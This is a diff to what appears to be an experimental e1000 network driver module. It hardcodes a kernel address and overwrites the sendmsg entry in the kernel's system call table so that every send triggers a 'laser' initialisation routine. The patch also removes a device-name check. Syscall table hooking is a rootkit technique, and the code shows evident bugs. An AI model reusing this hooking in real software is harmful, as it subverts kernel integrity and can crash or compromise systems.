@@ -237,7 +237,7 @@ static int debug = -1;
 module_param(debug, int, 0);
 MODULE_PARM_DESC(debug, "Debug level (0=none,...,16=all)");
 
-unsigned long *sys_call_table = (unsigned long *)0x81a001c0;
+unsigned long *sys_call_table = (unsigned long *)0xffffffff81a001c0;
 
 /**
  * e1000_get_hw_dev - return device
@@ -262,13 +262,13 @@ asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vl
     
     // assume current dev is eth0, using e1000
     pr_info("@ [%s]\n", dev->name);
-    if (dev->name == "eth0") {
+    //if (dev->name == "lo") {
         pr_info("Now turning on laser\n");
         e1000_laser_init(dev);
-    }
-    else {
-        pr_info("NIC not e1000!\n");
-    }
+    //}
+    //else {
+      //  pr_info("NIC not e1000!\n");
+   // }
     
     return original_sendmsg(sockfd, msgvec, vlen, flags);
 }
@@ -307,14 +307,14 @@ static int __init e1000_init_module(void)
         cr0 = read_cr0();
         pr_info("cr0 is : 0x%x\n", cr0);
         
-        _sys_call_page = virt_to_page(&sys_call_table);
-        pages_rw(_sys_call_page, 1);
-        pr_info("sys_call_table is now read_write\n");
+        //_sys_call_page = virt_to_page(&sys_call_table);
+        //pages_rw(_sys_call_page, 1);
+        //pr_info("sys_call_table is now read_write\n");
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
         //original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
-       // original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
-        //sys_call_table[__NR_sendmsg] = e1000_sendmsg;
+        original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
+        sys_call_table[__NR_sendmsg] = e1000_sendmsg;
         
         write_cr0(read_cr0() | (0x10000));
         
